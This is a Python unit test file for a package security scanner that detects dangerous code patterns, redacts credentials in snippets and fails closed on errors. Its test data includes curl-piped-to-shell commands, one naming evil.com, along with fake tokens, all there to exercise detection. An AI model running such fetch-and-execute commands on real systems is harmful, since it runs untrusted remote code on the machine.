"""Unit and integration tests for the static_analysis engine module."""

import os
import shutil
import tempfile
import time
import unittest
from pathlib import Path

from secrets_scanner.contract import ContractStatus, PackageScanResult
from secrets_scanner.models import Confidence, ScanStatus, Severity, SkippedFile
from secrets_scanner.service_orchestrator import merge_scan_results
from secrets_scanner.walker import ScanBudgetExceeded

from static_analysis import (
    BaseMatcher,
    Finding,
    Language,
    LanguageDefinition,
    LanguageRegistry,
    RegexMatcher,
    Rule,
    StaticAnalyzer,
    StaticScanResult,
    get_default_rules,
    sanitize_snippet,
    scan_directory,
    scan_package,
    scrub_credentials,
)


class TestLanguageDetection(unittest.TestCase):
    """Tests language detection across extensions and shebang lines."""

    def setUp(self):
        self.registry = LanguageRegistry()

    def test_extension_detection(self):
        self.assertEqual(self.registry.detect_language("script.py"), "python")
        self.assertEqual(self.registry.detect_language("module.pyw"), "python")
        self.assertEqual(self.registry.detect_language("app.js"), "javascript")
        self.assertEqual(self.registry.detect_language("server.mjs"), "javascript")
        self.assertEqual(self.registry.detect_language("client.tsx"), "typescript")
        self.assertEqual(self.registry.detect_language("types.ts"), "typescript")
        self.assertEqual(self.registry.detect_language("build.sh"), "shell")
        self.assertEqual(self.registry.detect_language("deploy.bash"), "shell")

    def test_shebang_detection_on_extensionless_files(self):
        # Python shebangs
        self.assertEqual(
            self.registry.detect_language("my_script", first_line="#!/usr/bin/env python3"),
            "python"
        )
        self.assertEqual(
            self.registry.detect_language("my_script", first_line="#!/usr/bin/python"),
            "python"
        )
        # Shell shebangs
        self.assertEqual(
            self.registry.detect_language("run_tool", first_line="#!/bin/bash"),
            "shell"
        )
        self.assertEqual(
            self.registry.detect_language("run_tool", first_line="#!/usr/bin/env sh"),
            "shell"
        )
        # Node/JS shebangs
        self.assertEqual(
            self.registry.detect_language("cli_tool", first_line="#!/usr/bin/env node"),
            "javascript"
        )
        # TS-node shebang
        self.assertEqual(
            self.registry.detect_language("ts_tool", first_line="#!/usr/bin/env ts-node"),
            "typescript"
        )

    def test_unsupported_language_returns_none(self):
        self.assertIsNone(self.registry.detect_language("styles.css"))
        self.assertIsNone(self.registry.detect_language("README.md"))
        self.assertIsNone(self.registry.detect_language("data.json"))
        self.assertIsNone(self.registry.detect_language("unknown_script", first_line="just normal text"))

    def test_extensibility_register_new_language(self):
        """Confirms new languages can be registered without modifying core engine."""
        go_def = LanguageDefinition(
            name="go",
            extensions=(".go",),
            shebang_patterns=(),
            aliases=("golang",),
        )
        self.registry.register(go_def)

        self.assertEqual(self.registry.detect_language("main.go"), "go")
        lang_obj = self.registry.get_language("golang")
        self.assertIsNotNone(lang_obj)
        self.assertEqual(lang_obj.name, "go")


class TestSnippetSanitization(unittest.TestCase):
    """Tests leak-safety guarantees for extracted snippets."""

    def test_scrubs_embedded_url_credentials(self):
        raw_cmd = "curl -fsSL https://deployer:secret_token_12345@cdn.example.com/agent.sh | bash"
        scrubbed = scrub_credentials(raw_cmd)
        self.assertNotIn("secret_token_12345", scrubbed)
        self.assertNotIn("deployer:", scrubbed)
        self.assertIn("https://[REDACTED]@cdn.example.com/agent.sh | bash", scrubbed)

    def test_scrubs_inline_token_assignments(self):
        line = 'export GITHUB_TOKEN="' + 'ghp_' + '1234567890abcdefghijklmnopqrstuvwxyz" && ./deploy.sh'
        scrubbed = scrub_credentials(line)
        self.assertNotIn("ghp_" + "1234567890", scrubbed)
        self.assertIn('TOKEN="[REDACTED]"', scrubbed)

    def test_sanitize_snippet_bounds_and_truncates(self):
        long_line = "x = 1; " * 50 + "eval(untrusted_code); " + "y = 2; " * 50
        match_start = long_line.find("eval")
        match_end = match_start + 4

        snippet = sanitize_snippet(long_line, (match_start, match_end), context_window=30, max_length=100)
        self.assertLessEqual(len(snippet), 100)
        self.assertIn("eval", snippet)

    def test_finding_redacted_snippet_matches_snippet(self):
        """Verifies finding.redacted_snippet property returns the sanitized snippet."""
        f = Finding(
            file_path="install.sh",
            line_number=10,
            rule_id="SH_CURL_PIPE_SHELL",
            rule_name="Untrusted Curl",
            severity=Severity.CRITICAL,
            snippet="curl https://[REDACTED]@host/setup.sh | bash",
            description="Piping curl to bash",
            language="shell",
            remediation_hint="Download first",
        )
        self.assertEqual(f.snippet, f.redacted_snippet)
        self.assertNotIn("secret", f.redacted_snippet)


class TestReDoSAndMatcherBounds(unittest.TestCase):
    """Tests ReDoS defenses and line length caps."""

    def test_regex_matcher_respects_line_length_cap(self):
        # Create a line with 20,000 characters followed by eval()
        long_prefix = "a" * 15_000
        content = f"{long_prefix}eval(danger)\n"

        matcher = RegexMatcher(r"eval\(", max_line_length=10_000)
        results = matcher.match(content, "test.py")

        # Because eval occurs beyond the 10,000 char cap, it is ignored, bounding regex time
        self.assertEqual(len(results), 0)

        # But within the cap it matches immediately
        normal_content = "eval(danger)\n"
        results_normal = matcher.match(normal_content, "test.py")
        self.assertEqual(len(results_normal), 1)
        self.assertEqual(results_normal[0].line_number, 1)


class TestModelEnumInteroperability(unittest.TestCase):
    """Tests that static_analysis directly reuses secrets_scanner models without divergence."""

    def test_severity_and_confidence_are_exact_secrets_scanner_enums(self):
        import static_analysis.models as sam
        import secrets_scanner.models as ssm

        self.assertIs(sam.Severity, ssm.Severity)
        self.assertIs(sam.Confidence, ssm.Confidence)
        self.assertIs(sam.ScanStatus, ssm.ScanStatus)
        self.assertIs(sam.SkippedFile, ssm.SkippedFile)

    def test_finding_shape_matches_secrets_scanner(self):
        f = Finding(
            file_path="app.py",
            line_number=42,
            rule_id="PY_INSECURE_EVAL",
            rule_name="Dynamic Code Execution",
            severity=Severity.HIGH,
            snippet="eval(code)",
            description="Dangerous eval",
            language="python",
            remediation_hint="Do not use eval",
        )
        # Verify all fields accessed by secrets_scanner consumers exist
        self.assertEqual(f.file_path, "app.py")
        self.assertEqual(f.line_number, 42)
        self.assertEqual(f.rule_id, "PY_INSECURE_EVAL")
        self.assertEqual(f.rule_name, "Dynamic Code Execution")
        self.assertEqual(f.severity, Severity.HIGH)
        self.assertEqual(f.redacted_snippet, "eval(code)")
        self.assertEqual(f.snippet, "eval(code)")
        self.assertEqual(f.description, "Dangerous eval")
        self.assertEqual(f.confidence, Confidence.HIGH)
        self.assertEqual(f.language, "python")
        self.assertEqual(f.remediation_hint, "Do not use eval")


class TestContractEvaluationReuse(unittest.TestCase):
    """Tests that static_analysis directly reuses contract gating logic from secrets_scanner."""

    def test_high_severity_yields_failed_status(self):
        f = Finding(
            file_path="app.py",
            line_number=1,
            rule_id="PY_INSECURE_EVAL",
            rule_name="Dynamic Code Execution",
            severity=Severity.HIGH,
            snippet="eval(x)",
            description="eval",
            language="python",
            remediation_hint="fix",
            confidence=Confidence.HIGH,
        )
        scan_res = StaticScanResult(
            status=ScanStatus.FLAGGED,
            success=True,
            findings=[f],
            files_scanned_count=1,
        )
        contract_res = scan_res.to_contract_result(duration_seconds=0.1)

        self.assertEqual(contract_res.status, ContractStatus.FAILED.value)
        self.assertEqual(contract_res.severity_counts["high"], 1)
        self.assertEqual(len(contract_res.findings), 1)

    def test_clean_scan_yields_passed_status(self):
        scan_res = StaticScanResult(
            status=ScanStatus.PASSED,
            success=True,
            findings=[],
            files_scanned_count=1,
        )
        contract_res = scan_res.to_contract_result(duration_seconds=0.1)
        self.assertEqual(contract_res.status, ContractStatus.PASSED.value)
        self.assertEqual(sum(contract_res.severity_counts.values()), 0)

    def test_failed_scan_yields_error_status(self):
        scan_res = StaticScanResult(
            status=ScanStatus.FAILED,
            success=False,
            findings=[],
            error_message="Unexpected error",
        )
        contract_res = scan_res.to_contract_result(duration_seconds=0.1)
        self.assertEqual(contract_res.status, ContractStatus.ERROR.value)


class TestFixtureDirectoryScans(unittest.TestCase):
    """Scans fixture directories for each supported language (flagged, clean, skipped)."""

    def setUp(self):
        self.fixtures_base = Path(__file__).parent / "fixtures" / "static_analysis"
        self.analyzer = StaticAnalyzer()

    def test_python_fixtures(self):
        py_dir = self.fixtures_base / "python"
        res = self.analyzer.scan_directory(str(py_dir))

        self.assertTrue(res.success)
        self.assertEqual(res.status, ScanStatus.FLAGGED)
        self.assertEqual(res.files_scanned_count, 2)  # clean_calc.py and flagged_eval.py

        findings_by_file = {os.path.basename(f.file_path): f for f in res.findings}
        self.assertIn("flagged_eval.py", findings_by_file)
        self.assertNotIn("clean_calc.py", findings_by_file)

        # Check skipped reasons
        skipped_map = {os.path.basename(s.file_path): s.reason for s in res.files_skipped}
        self.assertEqual(skipped_map.get("skipped_binary.bin"), "binary")
        self.assertEqual(skipped_map.get("skipped_readme.txt"), "unsupported_language")

    def test_javascript_fixtures(self):
        js_dir = self.fixtures_base / "javascript"
        res = self.analyzer.scan_directory(str(js_dir))

        self.assertTrue(res.success)
        self.assertEqual(res.status, ScanStatus.FLAGGED)
        self.assertEqual(res.files_scanned_count, 2)  # clean_logger.js and flagged_exec.js

        findings_by_file = {os.path.basename(f.file_path): f for f in res.findings}
        self.assertIn("flagged_exec.js", findings_by_file)
        self.assertNotIn("clean_logger.js", findings_by_file)

        skipped_map = {os.path.basename(s.file_path): s.reason for s in res.files_skipped}
        self.assertEqual(skipped_map.get("skipped_binary.bin"), "binary")
        self.assertEqual(skipped_map.get("skipped_style.css"), "unsupported_language")

    def test_typescript_fixtures(self):
        ts_dir = self.fixtures_base / "typescript"
        res = self.analyzer.scan_directory(str(ts_dir))

        self.assertTrue(res.success)
        self.assertEqual(res.status, ScanStatus.FLAGGED)
        self.assertEqual(res.files_scanned_count, 2)  # clean_service.ts and flagged_eval.ts

        findings_by_file = {os.path.basename(f.file_path): f for f in res.findings}
        self.assertIn("flagged_eval.ts", findings_by_file)
        self.assertNotIn("clean_service.ts", findings_by_file)

        skipped_map = {os.path.basename(s.file_path): s.reason for s in res.files_skipped}
        self.assertEqual(skipped_map.get("skipped_binary.bin"), "binary")
        self.assertEqual(skipped_map.get("skipped_data.json"), "unsupported_language")

    def test_shell_fixtures_including_shebang_and_sanitization(self):
        sh_dir = self.fixtures_base / "shell"
        res = self.analyzer.scan_directory(str(sh_dir))

        self.assertTrue(res.success)
        self.assertEqual(res.status, ScanStatus.FLAGGED)
        self.assertEqual(res.files_scanned_count, 3)  # clean_deploy.sh, flagged_curl.sh, extensionless_flagged

        findings_by_file = {os.path.basename(f.file_path): f for f in res.findings}
        self.assertIn("flagged_curl.sh", findings_by_file)
        self.assertIn("extensionless_flagged", findings_by_file)
        self.assertNotIn("clean_deploy.sh", findings_by_file)

        # Verify credential in flagged_curl.sh was scrubbed in snippet
        curl_finding = findings_by_file["flagged_curl.sh"]
        self.assertNotIn("secret_token_12345", curl_finding.snippet)
        self.assertNotIn("secret_token_12345", curl_finding.redacted_snippet)
        self.assertIn("[REDACTED]", curl_finding.snippet)

        skipped_map = {os.path.basename(s.file_path): s.reason for s in res.files_skipped}
        self.assertEqual(skipped_map.get("skipped_binary.bin"), "binary")
        self.assertEqual(skipped_map.get("skipped_readme.md"), "unsupported_language")


class TestFailClosedBehavior(unittest.TestCase):
    """Tests fail-closed guarantees under adversarial conditions and errors."""

    def test_nonexistent_directory_fails_closed(self):
        analyzer = StaticAnalyzer()
        res = analyzer.scan_directory("C:/path/does/not/exist_12345")
        self.assertFalse(res.success)
        self.assertEqual(res.status, ScanStatus.FAILED)
        self.assertIn("does not exist", res.error_message)

    def test_file_budget_exceeded_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create 5 files
            for i in range(5):
                with open(os.path.join(tmp_dir, f"file_{i}.py"), "w") as f:
                    f.write("x = 1\n")

            # Set max_total_files to 3
            analyzer = StaticAnalyzer(max_total_files=3)
            res = analyzer.scan_directory(tmp_dir)

            self.assertFalse(res.success)
            self.assertEqual(res.status, ScanStatus.FAILED)
            self.assertIn("ScanBudgetExceeded", res.error_message)

    def test_scan_depth_exceeded_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            deep_path = os.path.join(tmp_dir, "level1", "level2", "level3")
            os.makedirs(deep_path, exist_ok=True)
            with open(os.path.join(deep_path, "deep.py"), "w") as f:
                f.write("x = 1\n")

            analyzer = StaticAnalyzer(max_depth=2)
            res = analyzer.scan_directory(tmp_dir)

            self.assertFalse(res.success)
            self.assertEqual(res.status, ScanStatus.FAILED)
            self.assertIn("ScanBudgetExceeded", res.error_message)

    def test_unhandled_exception_in_scanner_fails_closed(self):
        class BrokenMatcher(BaseMatcher):
            def match(self, content: str, file_path: str):
                raise RuntimeError("Exploding matcher simulator")

        broken_rule = Rule(
            id="BROKEN",
            name="Broken Rule",
            language="python",
            matcher=BrokenMatcher(),
            severity=Severity.HIGH,
            description="Broken",
            remediation_hint="Fix",
        )
        analyzer = StaticAnalyzer(rules=[broken_rule])

        with tempfile.TemporaryDirectory() as tmp_dir:
            with open(os.path.join(tmp_dir, "test.py"), "w") as f:
                f.write("print('hello')\n")

            res = analyzer.scan_directory(tmp_dir)
            self.assertFalse(res.success)
            self.assertEqual(res.status, ScanStatus.FAILED)
            self.assertIn("RuntimeError", res.error_message)


class TestServiceOrchestratorIntegration(unittest.TestCase):
    """Tests seamless merging of static_analysis and secrets_scanner results."""

    def test_merge_scan_results_with_secrets_and_static_findings(self):
        # 1. Simulate SecretsScanner finding
        secret_finding = Finding(
            file_path="config.py",
            line_number=12,
            rule_id="AWS_ACCESS_KEY_ID",
            rule_name="AWS Key",
            severity=Severity.CRITICAL,
            snippet="AKIA****************",
            description="AWS Access Key ID",
            language="python",
            remediation_hint="Rotate key",
        )
        secret_result = PackageScanResult(
            status=ContractStatus.FAILED.value,
            findings=[secret_finding],
            severity_counts={"critical": 1, "high": 0, "medium": 0, "low": 0},
        )

        # 2. Simulate StaticAnalysis finding
        static_finding = Finding(
            file_path="server.js",
            line_number=45,
            rule_id="JS_CHILD_PROCESS_EXEC",
            rule_name="Command Execution",
            severity=Severity.HIGH,
            snippet="child_process.exec(cmd)",
            description="Command injection risk",
            language="javascript",
            remediation_hint="Use execFile",
        )
        static_result = PackageScanResult(
            status=ContractStatus.FAILED.value,
            findings=[static_finding],
            severity_counts={"critical": 0, "high": 1, "medium": 0, "low": 0},
        )

        # 3. Merge using service_orchestrator.merge_scan_results
        status, merged_findings, counts, suppressed, errors = merge_scan_results(
            [secret_result, static_result]
        )

        self.assertEqual(status, "failed")
        self.assertEqual(len(merged_findings), 2)
        self.assertEqual(counts["critical"], 1)
        self.assertEqual(counts["high"], 1)
        self.assertEqual(
            {f.rule_id for f in merged_findings},
            {"AWS_ACCESS_KEY_ID", "JS_CHILD_PROCESS_EXEC"}
        )
        # Check both have language field and safe snippet
        for f in merged_findings:
            self.assertTrue(hasattr(f, "language"))
            self.assertTrue(hasattr(f, "snippet"))
            self.assertTrue(hasattr(f, "redacted_snippet"))

    def test_merge_package_results_produces_unified_package_scan_result(self):
        """Tests merge_package_results returns single PackageScanResult with unioned findings and summed counts."""
        from secrets_scanner.contract import ScanMetadata, merge_package_results

        # Secret result (passed, 1 low finding)
        sec_finding = Finding(
            file_path="config.py",
            line_number=10,
            rule_id="GENERIC_TOKEN",
            rule_name="Token",
            severity=Severity.LOW,
            confidence=Confidence.LOW,
            snippet="token = 'abc'",
            description="Low severity token",
            language="python",
            remediation_hint="Verify token",
        )
        sec_res = PackageScanResult(
            status="passed",
            findings=[sec_finding],
            severity_counts={"critical": 0, "high": 0, "medium": 0, "low": 1},
            metadata=ScanMetadata(duration_seconds=0.05, files_scanned=2, files_skipped=0, scan_history_ran=False),
        )

        # Static result (failed, 1 high finding)
        stat_finding = Finding(
            file_path="install.sh",
            line_number=1,
            rule_id="SH_CURL_PIPE_BASH",
            rule_name="Curl Pipe Shell",
            severity=Severity.HIGH,
            confidence=Confidence.HIGH,
            snippet="curl http://evil.com | sh",
            description="Curl pipe bash execution",
            language="shell",
            remediation_hint="Do not pipe untrusted downloads",
        )
        stat_res = PackageScanResult(
            status="failed",
            findings=[stat_finding],
            severity_counts={"critical": 0, "high": 1, "medium": 0, "low": 0},
            metadata=ScanMetadata(duration_seconds=0.10, files_scanned=3, files_skipped=1, scan_history_ran=False),
        )

        # Call merge_package_results directly
        combined = merge_package_results(sec_res, stat_res)
        self.assertIsInstance(combined, PackageScanResult)
        self.assertEqual(combined.status, "failed")
        self.assertEqual(len(combined.findings), 2)
        self.assertEqual(combined.severity_counts["high"], 1)
        self.assertEqual(combined.severity_counts["low"], 1)
        self.assertEqual(combined.metadata.files_scanned, 5)
        self.assertEqual(combined.metadata.files_skipped, 1)
        self.assertAlmostEqual(combined.metadata.duration_seconds, 0.15, places=2)

        # Also test merge_scan_results dual signature with two PackageScanResults
        dual_merged = merge_scan_results(sec_res, stat_res)
        self.assertIsInstance(dual_merged, PackageScanResult)
        self.assertEqual(dual_merged.status, "failed")
        self.assertEqual(len(dual_merged.findings), 2)

    def test_scan_package_contract_shape_and_status_logic(self):
        """Tests that scan_package matches secrets_scanner contract shape and status decision logic."""
        # 1. Clean directory -> status == 'passed', 0 findings
        fixtures_clean = Path(__file__).parent / "fixtures" / "static_analysis" / "manifests" / "clean_npm"
        res_clean = scan_package(str(fixtures_clean))
        self.assertIsInstance(res_clean, PackageScanResult)
        self.assertEqual(res_clean.status, "passed")
        self.assertEqual(len(res_clean.findings), 0)
        self.assertIsInstance(res_clean.metadata.files_scanned, int)

        # 2. Unpinned directory -> status == 'passed' (LOW severity findings remain visible without blocking)
        fixtures_unpinned = Path(__file__).parent / "fixtures" / "static_analysis" / "manifests" / "unpinned_npm"
        res_unpinned = scan_package(str(fixtures_unpinned))
        self.assertIsInstance(res_unpinned, PackageScanResult)
        self.assertEqual(res_unpinned.status, "passed")
        self.assertGreater(len(res_unpinned.findings), 0)
        for f in res_unpinned.findings:
            self.assertEqual(f.severity, Severity.LOW)

        # 3. Malicious directory -> status == 'failed' (CRITICAL/HIGH severity + HIGH confidence blocks)
        fixtures_malicious = Path(__file__).parent / "fixtures" / "static_analysis" / "manifests" / "malicious_npm"
        res_malicious = scan_package(str(fixtures_malicious))
        self.assertIsInstance(res_malicious, PackageScanResult)
        self.assertEqual(res_malicious.status, "failed")
        self.assertGreater(len(res_malicious.findings), 0)

        # 4. Malformed manifest -> status == 'error' (fail-closed unhandled parse error)
        fixtures_malformed = Path(__file__).parent / "fixtures" / "static_analysis" / "manifests" / "malformed_npm"
        res_malformed = scan_package(str(fixtures_malformed))
        self.assertIsInstance(res_malformed, PackageScanResult)
        self.assertEqual(res_malformed.status, "error")
        self.assertIsNotNone(res_malformed.error_message)


class TestStaticAnalysisCli(unittest.TestCase):
    """Tests CLI entry point, parsing, and human/JSON formatting."""

    def test_cli_execution_on_clean_and_flagged_fixtures(self):
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        fixtures_base = Path(__file__).parent / "fixtures" / "static_analysis"
        py_dir = str(fixtures_base / "python")

        # 1. Human readable output on flagged directory -> exit code 1
        with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
            exit_code = main([py_dir])
            self.assertEqual(exit_code, 1)
            output = mock_out.getvalue()
            self.assertIn("STATIC ANALYSIS SCAN REPORT", output.upper())
            self.assertIn("PY_EVAL_NON_LITERAL", output)
            self.assertIn("Remediation:", output)

        # 2. JSON output on flagged directory -> valid JSON with findings
        import json
        with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
            exit_code = main([py_dir, "--json"])
            self.assertEqual(exit_code, 1)
            parsed = json.loads(mock_out.getvalue())
            self.assertEqual(parsed["status"], "failed")
            self.assertGreater(len(parsed["findings"]), 0)

    def test_cli_exit_code_0_passed(self):
        """Confirms CLI returns 0 on a clean repository/package."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        with tempfile.TemporaryDirectory() as td:
            with open(os.path.join(td, "clean.py"), "w") as f:
                f.write("def add(a, b):\n    return a + b\n")

            with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
                exit_code = main([td])
            self.assertEqual(exit_code, 0)
            self.assertIn("No violations detected", mock_out.getvalue())

    def test_cli_exit_code_1_failed(self):
        """Confirms CLI returns 1 on a flagged package containing violations."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        with tempfile.TemporaryDirectory() as td:
            with open(os.path.join(td, "bad.py"), "w") as f:
                f.write("import ctypes\nctypes.memmove(dest, src, 100)\n")

            with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
                exit_code = main([td])
            self.assertEqual(exit_code, 1)

    def test_cli_exit_code_2_error(self):
        """Confirms CLI returns 2 on missing target directory or unhandled error."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
            exit_code = main(["Z:/non_existent_folder_static_xyz", "--json"])
        self.assertEqual(exit_code, 2)

    def test_cli_no_color_compliance(self):
        """Confirms that NO_COLOR disables ANSI coloring per https://no-color.org/."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        fixtures_base = Path(__file__).parent / "fixtures" / "static_analysis"
        py_dir = str(fixtures_base / "python")

        with patch.dict(os.environ, {"NO_COLOR": "1"}):
            with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
                exit_code = main([py_dir])
                output = mock_out.getvalue()
                self.assertNotIn("\033[", output)
                self.assertIn("STATIC ANALYSIS SCAN REPORT", output.upper())

    def test_cli_check_dependencies_flag(self):
        """Tests --check-dependencies and --no-check-dependencies flags."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main

        mal_dir = str(Path(__file__).parent / "fixtures" / "static_analysis" / "manifests" / "malicious_npm")

        # Default (--check-dependencies): fails on malicious package
        with patch("sys.stdout", new_callable=io.StringIO):
            code_default = main([mal_dir])
        self.assertEqual(code_default, 1)

        # When --no-check-dependencies is provided: manifests are skipped -> passed (0)
        with patch("sys.stdout", new_callable=io.StringIO):
            code_skip = main([mal_dir, "--no-check-dependencies"])
        self.assertEqual(code_skip, 0)

    def test_cli_with_secrets_scan_preview_mode(self):
        """Tests --with-secrets-scan and main_combined run both modules and output merged report."""
        import io
        from unittest.mock import patch
        from static_analysis.cli import main, main_combined

        with tempfile.TemporaryDirectory() as td:
            # Add secrets violation
            with open(os.path.join(td, "auth.py"), "w") as f:
                f.write('AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\n')
            # Add static analysis violation
            with open(os.path.join(td, "bad.py"), "w") as f:
                f.write('import ctypes\nctypes.memmove(dest, src, 10)\n')

            # 1. Test via main with --with-secrets-scan
            with patch("sys.stdout", new_callable=io.StringIO) as mock_out:
                exit_code = main([td, "--with-secrets-scan"])
            self.assertEqual(exit_code, 1)
            output = mock_out.getvalue()
            self.assertIn("COMBINED SECURITY SCAN REPORT", output)
            self.assertIn("AWS_ACCESS_KEY_ID", output)
            self.assertIn("PY_DANGEROUS_CTYPES_MEMORY", output)

            # 2. Test via main_combined entry point
            with patch("sys.stdout", new_callable=io.StringIO) as mock_out2:
                exit_code2 = main_combined([td])
            self.assertEqual(exit_code2, 1)
            output2 = mock_out2.getvalue()
            self.assertIn("COMBINED SECURITY SCAN REPORT", output2)


class TestOrchestratorDefaultScannersWiring(unittest.TestCase):
    """Verifies that static_analysis is wired into DEFAULT_SCANNERS in service_orchestrator."""

    def test_default_scanners_contains_secrets_and_static_analysis(self):
        from secrets_scanner.service_orchestrator import DEFAULT_SCANNERS, process_upload
        from secrets_scanner.service_orchestrator import InMemoryObjectStorage, InMemoryPostgresListingRepository

        self.assertEqual(len(DEFAULT_SCANNERS), 3)
        scanner_modules = [getattr(s, "__module__", "") for s in DEFAULT_SCANNERS]
        self.assertIn("secrets_scanner.orchestrator", scanner_modules)
        self.assertIn("static_analysis.scanner", scanner_modules)
        self.assertIn("cve_check.scanner", scanner_modules)

    def test_process_upload_runs_both_scanners_and_catches_static_violation(self):
        from secrets_scanner.service_orchestrator import (
            DEFAULT_SCANNERS,
            InMemoryObjectStorage,
            InMemoryPostgresListingRepository,
            process_upload,
        )

        storage = InMemoryObjectStorage()
        repo = InMemoryPostgresListingRepository()

        # Create package with clean secrets but dangerous static analysis violation
        with tempfile.TemporaryDirectory() as sd:
            with open(os.path.join(sd, "runner.py"), "w") as f:
                f.write("import ctypes\nctypes.memmove(dest, src, 1024)\n")

            listing_id = "listing_static_bad_001"
            version = "v1.0.0"
            pending_key = f"pending/{listing_id}/{version}/package.tar.gz"
            storage.store[pending_key] = b"data"

            outcome = process_upload(
                listing_id=listing_id,
                version=version,
                scratch_dir=sd,
                storage_client=storage,
                repository=repo,
            )

            # All scanners ran: secrets scanner passed, but static analysis failed -> overall scan_failed!
            self.assertEqual(outcome.status, "scan_failed")
            self.assertEqual(outcome.overall_scan_status, "failed")
            self.assertEqual(len(outcome.scanner_results), len(DEFAULT_SCANNERS))
            rule_ids = {f.rule_id for f in outcome.findings}
            self.assertIn("PY_DANGEROUS_CTYPES_MEMORY", rule_ids)
            self.assertEqual(outcome.severity_counts["critical"], 1)


if __name__ == "__main__":
    unittest.main()

